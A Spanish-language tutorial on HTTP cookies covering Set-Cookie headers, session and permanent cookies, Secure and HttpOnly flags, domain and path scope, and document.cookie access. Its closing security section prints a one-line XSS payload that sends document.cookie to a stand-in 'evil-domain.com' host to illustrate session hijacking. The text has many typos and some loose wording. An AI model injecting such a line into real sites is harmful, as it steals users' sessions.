# **HTTP COOKIE**

Una **http cookie** (ya sea referido a web cookie, cookie en navegado,etc.) es una pequeño fragmento de datos que un servidor envía al navegador web de cualquier usuario, que puede almacenarlo y devolverlo con la siguiente solicitud al mismo servidor.
El uso de cookies en programacion tiene como objetivo saber si, dos solicitudes procedían del mismo ordenador.

 Las cookies se utiliza principalmente para tres propositos:

 - Gestion de sesesione( inicios de sesion de usuarios, carritos de compras).
 - Personalización (preferencias del usuario).
 - Seguimiento (análisis del comportamiento del usuario).

Las cookies también se han utilizado para el almacenamiento general del lado del cliente. Anteriormente era la única forma para el almacenamiento del lado del cliente, ya no es el caso hoy en día, donde los navegadores web son capaces de utilizar varias API de almacenamiento. Dado que las cookies se envían junto con cada solicitud, puede ser una carga de rendimiento adicional (especialmente para la web móvil). Las API nuevas a considerar para el almacenamiento local son la API de almacenamiento Web (localStorage y sessionStorage) y IndexedDB.


## Ceacion de cookies.

Al recibir una petición  HTTP se puedeenviar un encabezado cookie con la respuesta. La cookie normamente e almacenaen el navegador y, posteriormente, se envía el valor juntocon cadasolicitud hechaal mismo servidoque el contenido del encabezado de la Cookie.

#### Las Set-Cookie y las Cookie headers.

Las Set-Cookie HTTP son usadas para enviar cookies desde el servidor a el agente de usuario.

Una forma sencilla de configurar una cookie puede ser de la siguiente manera:

`
Set-Cookie: <cookie-name>=<cookie-value>
`

Aquí, el servidor le dice al cliente que almacene una cookie (por ejemplo, aplicaciones como PHP, Node.js, Python o Ruby on Rails).
La respuesta enviada al navegador contendrá el encabezado Set-Cookie y el navegador almacena la cookie.


#### Session cookies

La cookie creada anteriormente es una session cookie: se elminará cuando el cliente se cierre. No especifican caducidad máxima.
Algunos navegadores web tiene habilitada la restauración de sesiones, lo que provoca que estas cookies temporales sean permanentes, como si el navegador nunca se cerrase.

#### Permanent cookies

Estas cookies no expiran cuando el navegador cieere , sino  que tienen una fecha especificada.

`
Set-Cookie: id=a3fWa; Expires=Wed, 21 Oct 2015 07:28:00 GMT;
`

#### Secure and HttpOnly cookies

Una secure cookies sólo se enviará al servidor cuando se realice una solicitud usando SSL y el protocilo HTTP.
Sin embargo, tengan en cuenta que la información privada nunca debe enviarse en cookies HTTP ya que todo el protocolo es inseguro y este no le ofrecerá ningún  cifrado o seguridad adicional.

Para evitar ataques de secuencias de comandos entre sitios, las cookies sólo de HTTP no son accesibles a través de javascript a través de la propiedad Document.cookie, las API XMLHttpRequest y Request.


`
Set-Cookie: id=a3fWa; Expires=Wed, 21 Oct 2015 07:28:00 GMT; Secure; HttpOnly
`

#### Ámbito de cookies


Las directivas de dominio y ruta definen el ámbito de la cookie, es decir, el conjunto de URL a las que se deben enviar las cookies.

El dominio especifica los hosts a los que se enviará la cookie. Si no se especifica, el valor predeterminado es la parte del host de la ubicación del documento actual (pero sin incluir subdominios). Si se especifica un dominio, los subdominios siempre se incluyen.

Si se establece Domain = mozilla.org, las cookies se incluyen en subdominios como developer.mozilla.org.

Path indica una ruta de acceso de URL que debe existir en el recurso solicitado antes de enviar el encabezado de Cookie. El carácter% x2F ("/") se interpreta como un separador de directorios y los subdirectorios se emparejarán también.

Si se establece Path = / docs, todos estos caminos coincidirán:


- "/docs",
- "/docs/Web/",
- "docs/Web/HTTP"

#### Accediendo desde JavaScript usando Document.cookies


````.js
document.cookie = "yummy_cookie=choco";
document.cookie = "tasty_cookie=strawberry";
console.log(document.cookie);
// logs "yummy_cookie=choco; tasty_cookie=strawberry"
````


### Seguridad

#### Session hijacking y XSS

Las cookies se utilizan a menudo en la aplicación web ara identificar a un usuario y su sesión autenticada. Robar una cookie puede llevar a robar la sesion de algún usuario autenticado.

`
(new Image()).src = "http://www.evil-domain.com/steal-cookie.php?cookie=" + document.cookie;
`
